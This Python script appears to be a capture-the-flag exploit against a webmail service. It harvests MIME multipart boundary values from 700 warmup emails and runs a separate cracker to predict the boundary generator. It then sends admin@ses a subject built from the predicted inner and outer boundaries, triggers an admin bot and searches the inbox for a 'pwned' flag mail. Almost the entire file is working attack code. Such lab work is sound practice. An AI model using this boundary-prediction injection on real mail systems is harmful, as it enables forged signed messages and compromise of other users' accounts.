"""Final run: fresh instance -> warmup -> crack -> self-align -> exploit -> 2 bots -> harvest.
Payload: make_D(B1, B2) with
  B1 = reply's inner multipart/mixed boundary   (MT call N+1)
  B2 = reply's outer multipart/signed boundary  (MT call N+2)
"""
import sys, os, json, re, time, subprocess, http.client
from urllib.parse import urlparse
sys.path.insert(0, r'.')
from _z_496_spec import make_D, make_subj, PWN

BASE = sys.argv[1].rstrip('/')
WARM = int(sys.argv[2]) if len(sys.argv) > 2 else 700
u = urlparse(BASE)
HOST, PORT = u.hostname, u.port or 80
conn = http.client.HTTPConnection(HOST, PORT, timeout=60)


def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            d = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, d[:300]))
            return json.loads(d)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            try: conn.close()
            except Exception: pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=60)
            time.sleep(0.2)
    raise last


pw = req('GET', '/api/password')
tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
print('[i] pw', pw, 'me', req('GET', '/api/me', None, tok), flush=True)

ids = []
t0 = time.time()
for i in range(WARM):
    ids.append(req('POST', '/api/send', {'to': 'user@ses', 'subject': 'q%d' % i, 'body': 'b'}, tok))
print('[i] warmup %d in %.1fs' % (len(ids), time.time() - t0), flush=True)
emails = req('GET', '/api/emails', None, tok)
rows = []
for eid in ids:
    e = emails.get(eid)
    if e:
        m = re.search(r'boundary="=+(\d+)=+"', e['data'])
        if m:
            rows.append((e['time'], int(m.group(1))))
rows.sort()
print('[i] rows %d dup %d' % (len(rows), len(rows) - len(set(t for t, _ in rows))))
json.dump([b for _, b in rows], open(r'./_z_496_bounds.json', 'w'))

t0 = time.time()
r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                   capture_output=True, text=True)
print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0), r.stdout.strip().splitlines()[-1][:200])
if r.returncode != 0:
    print(r.stderr[-600:]); sys.exit(1)
preds = json.load(open(r'./_z_496_pred.json'))

pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'align', 'body': 'b'}, tok)
em = req('GET', '/api/email/' + pid, None, tok)
got = int(re.search(r'boundary="=+(\d+)=+"', em['data']).group(1))
if got not in preds:
    sys.exit('[!] alignment lost')
NEXT = preds.index(got) + 1
print('[i] aligned probe=preds[%d], exploit will consume preds[%d], reply inner=preds[%d], outer=preds[%d]'
      % (NEXT - 1, NEXT, NEXT + 1, NEXT + 2))

B1 = '=' * 15 + ('%019d' % preds[NEXT + 1]) + '=='
B2 = '=' * 15 + ('%019d' % preds[NEXT + 2]) + '=='
print('[i] B1 =', B1)
print('[i] B2 =', B2)
eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': make_subj(B1, B2, 'admin@ses'), 'body': 'hello'}, tok)
print('[i] exploit mail', eid, flush=True)

for run in (1, 2):
    t0 = time.time()
    print('[i] bot run %d ->' % run, req('POST', '/api/admin_bot', None, tok),
          '%.1fs' % (time.time() - t0), flush=True)
    time.sleep(1)

for attempt in range(10):
    emails = req('GET', '/api/emails', None, tok)
    for k, e in emails.items():
        d = e['data']
        if re.search(r'(?i)^Subject: pwned', d):
            print('=== FLAG MAIL ===')
            print(d[:3000])
            sys.exit(0)
    print('[i] retry %d inbox=%d' % (attempt, len(emails)), flush=True)
    time.sleep(3)
print('[-] no flag mail')
